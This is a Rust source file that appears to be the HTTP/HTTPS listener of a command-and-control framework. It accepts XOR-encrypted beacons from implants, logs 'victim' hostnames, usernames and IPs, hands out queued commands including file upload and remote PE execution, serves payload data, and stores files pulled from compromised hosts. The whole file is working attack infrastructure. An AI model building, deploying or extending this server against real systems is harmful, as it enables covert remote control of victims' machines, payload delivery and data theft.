use crate::admin::Database;
use crate::agents::agent_handler::{AgentHandler, AgentInfo};
use crate::encryption::XORCipher;
use crate::helper::helper_listener::{empty_response, json_error, text_response};
use crate::listener::profile::{ListenerProfile, ListenerProfileHttps};
use axum::Server;
use axum::{
    body::Bytes,
    extract::{Path, State},
    http::{HeaderMap, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
    Router,
};
use axum_server::tls_rustls::RustlsConfig;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use std::sync::Arc;

// ============================================================================
// STATE
// ============================================================================

#[derive(Clone)]
pub struct ListenerState {
    profile: ListenerProfile,
    agent_handler: AgentHandler,
    xor_cipher: Arc<XORCipher>,
    database: Arc<Database>,
}

impl ListenerState {
    pub fn new(
        profile: ListenerProfile,
        agent_handler: AgentHandler,
        database: Arc<Database>,
    ) -> Self {
        let xor_cipher = Arc::new(XORCipher::new(&profile.xor_key));
        Self {
            profile,
            agent_handler,
            xor_cipher,
            database,
        }
    }

    fn decrypt_body(&self, body: &Bytes) -> Result<String, ListenerError> {
        let body_str = std::str::from_utf8(body)
            .map_err(|_| ListenerError::InvalidUtf8)?
            .trim();

        let encrypted = STANDARD
            .decode(body_str)
            .map_err(|_| ListenerError::Base64Decode)?;

        let decrypted = self.xor_cipher.decrypt(&encrypted);

        String::from_utf8(decrypted).map_err(|_| ListenerError::InvalidUtf8)
    }

    fn encrypt_response<T: Serialize>(&self, data: &T) -> String {
        let json = serde_json::to_string(data).unwrap_or_default();
        let encrypted = self.xor_cipher.encrypt(json.as_bytes());
        STANDARD.encode(&encrypted)
    }

    fn validate_user_agent(&self, headers: &HeaderMap) -> Result<(), ListenerError> {
        match headers.get("user-agent").and_then(|h| h.to_str().ok()) {
            Some(ua) if ua == self.profile.user_agent => Ok(()),
            _ => Err(ListenerError::InvalidUserAgent),
        }
    }
}

// ============================================================================
// ERROR HANDLING
// ============================================================================

#[derive(Debug)]
enum ListenerError {
    InvalidUserAgent,
    InvalidUtf8,
    Base64Decode,
    JsonParse,
    Database(String),
}

impl ListenerError {
    fn status_code(&self) -> StatusCode {
        match self {
            Self::InvalidUserAgent => StatusCode::FORBIDDEN,
            Self::InvalidUtf8 | Self::Base64Decode | Self::JsonParse => StatusCode::BAD_REQUEST,
            Self::Database(_) => StatusCode::INTERNAL_SERVER_ERROR,
        }
    }

    fn log_message(&self) -> &str {
        match self {
            Self::InvalidUserAgent => "Invalid or missing User-Agent",
            Self::InvalidUtf8 => "Invalid UTF-8 in request",
            Self::Base64Decode => "Base64 decode failed",
            Self::JsonParse => "JSON parse failed",
            Self::Database(msg) => msg,
        }
    }
}

impl IntoResponse for ListenerError {
    fn into_response(self) -> Response {
        log::warn!("[LISTENER] {}", self.log_message());
        empty_response(self.status_code()).into_response()
    }
}

// ============================================================================
// DATA STRUCTURES
// ============================================================================

#[derive(Debug, Deserialize, Serialize)]
struct AgentBeacon {
    agent_id: String,
    hostname: String,
    username: String,
    process_name: String,
    ip_address: String,
    results: String,
}

#[derive(Serialize)]
struct CheckinResponse {
    success: bool,
    message: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct CommandItem {
    id: i64,
    command: String,
}

#[derive(Serialize)]
struct CommandResponse {
    success: bool,
    commands: Vec<CommandItem>,
}

#[derive(Deserialize)]
struct CommandRequest {
    agent_id: String,
}

#[derive(Deserialize)]
struct ResultSubmit {
    agent_id: String,
    command_id: Option<i64>,
    output: String,
    success: bool,
    r#types: String,
}

// ============================================================================
// HANDLERS
// ============================================================================

async fn handle_beacon(
    State(state): State<Arc<ListenerState>>,
    headers: HeaderMap,
    body: Bytes,
) -> Result<Response<String>, ListenerError> {
    state.validate_user_agent(&headers)?;

    let json_data = state.decrypt_body(&body)?;
    log::debug!("[LISTENER] Decrypted beacon: {}", json_data);

    let beacon: AgentBeacon =
        serde_json::from_str(&json_data).map_err(|_| ListenerError::JsonParse)?;

    log::info!(
        "[+] Beacon from agent {} ({}@{} - {})",
        beacon.agent_id,
        beacon.username,
        beacon.hostname,
        beacon.ip_address
    );

    update_or_register_agent(&state, &beacon);

    if let Err(e) = state.database.update_victim_info(
        &beacon.agent_id,
        &beacon.hostname,
        &beacon.username,
        "Windows",
        &beacon.ip_address,
        &beacon.process_name,
    ) {
        log::warn!("[!] Failed to update victim info: {}", e);
    }

    if !beacon.results.is_empty() {
        process_beacon_results(&state, &beacon);
    }

    let response = CheckinResponse {
        success: true,
        message: "Check-in successful".to_string(),
    };

    Ok(text_response(
        StatusCode::OK,
        state.encrypt_response(&response),
    ))
}

async fn handle_get_commands(
    State(state): State<Arc<ListenerState>>,
    headers: HeaderMap,
    body: Bytes,
) -> Result<Response<String>, ListenerError> {
    state.validate_user_agent(&headers)?;

    let json_data = state.decrypt_body(&body)?;
    let request: CommandRequest =
        serde_json::from_str(&json_data).map_err(|_| ListenerError::JsonParse)?;

    log::info!("[+] Command request from agent {}", request.agent_id);

    let commands = fetch_commands_with_data(&state, &request.agent_id);

    let response = CommandResponse {
        success: true,
        commands,
    };

    Ok(text_response(
        StatusCode::OK,
        state.encrypt_response(&response),
    ))
}

async fn handle_submit_result(
    State(state): State<Arc<ListenerState>>,
    headers: HeaderMap,
    body: Bytes,
) -> Result<Response<String>, ListenerError> {
    state.validate_user_agent(&headers)?;

    let json_data = state.decrypt_body(&body)?;
    let result: ResultSubmit =
        serde_json::from_str(&json_data).map_err(|_| ListenerError::JsonParse)?;

    log::info!(
        "[+] Result | agent={} | cmd={:?} | type={} | success={} | len={}",
        result.agent_id,
        result.command_id,
        result.r#types,
        result.success,
        result.output.len()
    );

    let (output_to_store, filename) = extract_result_content(&result);

    match state.database.store_result(
        &result.agent_id,
        result.command_id,
        &output_to_store,
        result.success,
        Some(&result.r#types),
    ) {
        Ok(result_id) => {
            let filename_log = filename
                .or_else(|| {
                    result
                        .command_id
                        .and_then(|id| state.database.extract_filename_from_command_id(id))
                })
                .unwrap_or_else(|| "None".to_string());

            log::info!(
                "[+] Result stored | id={} | file={} | size={}",
                result_id,
                filename_log,
                output_to_store.len()
            );
        }
        Err(e) => {
            log::error!("[!] Failed to store result: {}", e);
            return Err(ListenerError::Database(e.to_string()));
        }
    }

    let response = serde_json::json!({ "success": true });
    Ok(text_response(
        StatusCode::OK,
        state.encrypt_response(&response),
    ))
}

async fn handle_pe_data(
    State(state): State<Arc<ListenerState>>,
    Path(command_id): Path<i64>,
) -> Response<String> {
    log::info!("[PE-DATA] Request for command {}", command_id);

    match state.database.get_pe_exec_data_by_command(command_id) {
        Ok(Some(pe_data)) => {
            log::info!(
                "[PE-DATA] Found | cmd={} | size={} bytes",
                command_id,
                pe_data.len()
            );

            let encrypted = state.xor_cipher.encrypt(pe_data.as_bytes());
            let encoded = STANDARD.encode(&encrypted);

            text_response(StatusCode::OK, encoded)
        }
        Ok(None) => {
            log::warn!("[PE-DATA] Not found for command {}", command_id);
            json_error(StatusCode::NOT_FOUND, "PE data not found")
        }
        Err(e) => {
            log::error!("[PE-DATA] Database error: {}", e);
            json_error(StatusCode::INTERNAL_SERVER_ERROR, &e.to_string())
        }
    }
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

fn update_or_register_agent(state: &ListenerState, beacon: &AgentBeacon) {
    let timestamp = AgentHandler::get_current_timestamp();

    if let Some(mut agent) = state.agent_handler.get_agent(&beacon.agent_id) {
        agent.hostname = Some(beacon.hostname.clone());
        agent.username = Some(beacon.username.clone());
        agent.process_name = Some(beacon.process_name.clone());
        agent.ip = Some(beacon.ip_address.clone());
        agent.last_seen = timestamp;

        state
            .agent_handler
            .update_agent(&beacon.agent_id, agent, Some(&state.database));
    } else {
        log::info!("[+] New agent detected: {}", beacon.agent_id);

        let agent_info = AgentInfo {
            agent_id: beacon.agent_id.clone(),
            hostname: Some(beacon.hostname.clone()),
            username: Some(beacon.username.clone()),
            process_name: Some(beacon.process_name.clone()),
            ip: Some(beacon.ip_address.clone()),
            last_seen: timestamp,
            payload_type: "exe".to_string(),
            listener_name: state.profile.name.clone(),
            file_path: None,
        };

        state.agent_handler.register_agent(
            beacon.agent_id.clone(),
            agent_info,
            Some(&state.database),
        );
    }
}

fn process_beacon_results(state: &ListenerState, beacon: &AgentBeacon) {
    log::info!("[+] Processing results from {}", beacon.agent_id);

    state
        .agent_handler
        .push_result(&beacon.agent_id, beacon.results.clone());

    let (output, result_type, filename) = parse_beacon_result(&beacon.results);

    if let Err(e) =
        state
            .database
            .store_result(&beacon.agent_id, None, &output, true, Some(result_type))
    {
        log::warn!("[!] Failed to store beacon result: {}", e);
    } else {
        log::info!(
            "[+] Result stored | type={} | file={:?} | size={}",
            result_type,
            filename,
            output.len()
        );
    }
}

fn parse_beacon_result(results: &str) -> (String, &'static str, Option<String>) {
    if results.starts_with("File uploaded successfully")
        || results.starts_with("Upload successful")
        || results.starts_with("Error:")
    {
        return (results.to_string(), "text", None);
    }

    let decoded = match STANDARD.decode(results) {
        Ok(bytes) => String::from_utf8(bytes).unwrap_or_else(|_| results.to_string()),
        Err(_) => results.to_string(),
    };

    if decoded.starts_with("Error:") {
        return (decoded, "text", None);
    }

    let normalized = decoded.replace('\'', "\"");
    if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&normalized) {
        if let Some(content) = parsed.get("content").and_then(|v| v.as_str()) {
            let filename = parsed
                .get("filename")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());

            return (content.to_string(), "file_download", filename);
        }
    }

    (decoded, "text", None)
}

fn extract_result_content(result: &ResultSubmit) -> (String, Option<String>) {
    if result.r#types != "file" {
        return (result.output.clone(), None);
    }

    let decoded = match STANDARD.decode(&result.output) {
        Ok(bytes) => match String::from_utf8(bytes) {
            Ok(s) => s,
            Err(_) => return (result.output.clone(), None),
        },
        Err(_) => return (result.output.clone(), None),
    };

    if decoded.starts_with("Error:") || !result.success {
        return (decoded, None);
    }

    let normalized = decoded.replace('\'', "\"");
    match serde_json::from_str::<serde_json::Value>(&normalized) {
        Ok(parsed) => {
            let content = parsed
                .get("content")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());
            let filename = parsed
                .get("filename")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());

            match (content, filename.clone()) {
                (Some(c), Some(f)) => {
                    log::info!("[+] File parsed | name='{}' | size={}", f, c.len());
                    (c, Some(f))
                }
                _ => (decoded, None),
            }
        }
        Err(_) => (decoded, None),
    }
}

fn fetch_commands_with_data(state: &ListenerState, agent_id: &str) -> Vec<CommandItem> {
    let mut commands = Vec::new();

    let pending = match state.database.get_pending_commands(agent_id) {
        Ok(cmds) => cmds,
        Err(e) => {
            log::error!("[!] Failed to fetch commands: {}", e);
            return commands;
        }
    };

    for (cmd_id, cmd) in pending {
        let command = if cmd.contains("'upload':") {
            state
                .database
                .get_upload_data_for_command(cmd_id)
                .ok()
                .flatten()
                .map(|data| format!("'upload':'{}'", data))
                .unwrap_or(cmd)
        } else if cmd.contains("'pe-exec':") {
            state
                .database
                .get_pe_exec_data_by_command(cmd_id)
                .ok()
                .flatten()
                .map(|data| format!("'pe-exec':'{}'", data))
                .unwrap_or(cmd)
        } else {
            cmd
        };

        commands.push(CommandItem {
            id: cmd_id,
            command,
        });
    }

    commands
}

fn build_router(state: Arc<ListenerState>) -> Router {
    let uri_path = state.profile.uri_paths.clone();

    Router::new()
        .route(&uri_path, post(handle_beacon))
        .route("/api/pe-data/:command_id", get(handle_pe_data))
        .route("/api/command", post(handle_get_commands))
        .route("/api/result", post(handle_submit_result))
        .with_state(state)
}

fn load_agents_from_db(
    listener_name: &str,
    agent_handler: &AgentHandler,
    database: &Arc<Database>,
) {
    log::info!("[*] Loading agents for listener '{}'...", listener_name);

    match agent_handler.load_agents_from_db(database) {
        Ok(count) if count > 0 => {
            log::info!("[+] Restored {} agent(s) from database", count);
        }
        Ok(_) => {
            log::info!("[*] No existing agents to restore");
        }
        Err(e) => {
            log::error!("[!] Failed to load agents: {}", e);
        }
    }
}

// ============================================================================
// PUBLIC API
// ============================================================================

pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, database: Arc<Database>) {
    load_agents_from_db(&profile.name, &agent_handler, &database);

    let state = Arc::new(ListenerState::new(profile.clone(), agent_handler, database));
    let app = build_router(state);

    let addr = SocketAddr::from(([0, 0, 0, 0], profile.port));
    log::info!("[+] HTTP Listener '{}' starting on {}", profile.name, addr);

    if let Err(e) = Server::bind(&addr).serve(app.into_make_service()).await {
        log::error!("[!] HTTP Listener error: {}", e);
    }
}

pub async fn start_https(
    profile: ListenerProfileHttps,
    agent_handler: AgentHandler,
    database: Arc<Database>,
) {
    load_agents_from_db(&profile.name, &agent_handler, &database);

    let tls_config = match RustlsConfig::from_pem(
        profile.tls_cert.as_bytes().to_vec(),
        profile.tls_key.as_bytes().to_vec(),
    )
    .await
    {
        Ok(config) => {
            log::info!("[+] TLS configuration loaded");
            config
        }
        Err(e) => {
            log::error!("[!] Failed to load TLS config: {}", e);
            return;
        }
    };

    let http_profile = ListenerProfile {
        name: profile.name.clone(),
        host: profile.host.clone(),
        listener_type: profile.listener_type.clone(),
        port: profile.port,
        user_agent: profile.user_agent.clone(),
        xor_key: profile.xor_key.clone(),
        uri_paths: profile.uri_paths.clone(),
        http_headers: profile.http_headers.clone(),
    };

    let state = Arc::new(ListenerState::new(http_profile, agent_handler, database));
    let app = build_router(state);

    let addr = SocketAddr::from(([0, 0, 0, 0], profile.port));
    log::info!(
        "[+] HTTPS Listener '{}' starting on {} (TLS)",
        profile.name,
        addr
    );

    if let Err(e) = axum_server::bind_rustls(addr, tls_config)
        .serve(app.into_make_service())
        .await
    {
        log::error!("[!] HTTPS Listener error: {}", e);
    }
}
